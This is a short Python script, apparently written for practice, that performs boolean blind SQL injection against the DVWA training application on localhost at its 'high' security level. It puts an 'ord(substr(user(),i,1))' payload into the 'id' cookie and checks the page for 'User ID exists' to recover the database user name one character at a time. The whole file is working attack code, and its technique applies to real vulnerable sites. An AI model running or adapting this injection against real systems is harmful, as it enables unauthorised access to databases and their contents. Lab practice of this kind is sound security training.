#!-*-encoding:utf-8 -*-
import requests
for i in range(1,15):
    for j in range(63,123):
        # head = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"}
        cookies = {"id":"1' and ord(substr(user(),"+str(i)+",1))="+str(j)+" %23","security": "high", "PHPSESSID": "teibjf00ic4i6pc3lclf5sp2q4"}
        url = "http://localhost/dvwa-master/vulnerabilities/sqli_blind/cookie-input.php"  # 定义url
        url_a = "http://localhost/dvwa-master/vulnerabilities/sqli_blind/"
        get = requests.post(url,cookies=cookies,timeout=10)
        get_a = requests.get(url_a,cookies=cookies,timeout=10)
        if 'User ID exists in the database.' in get_a.text:
            print chr(j),									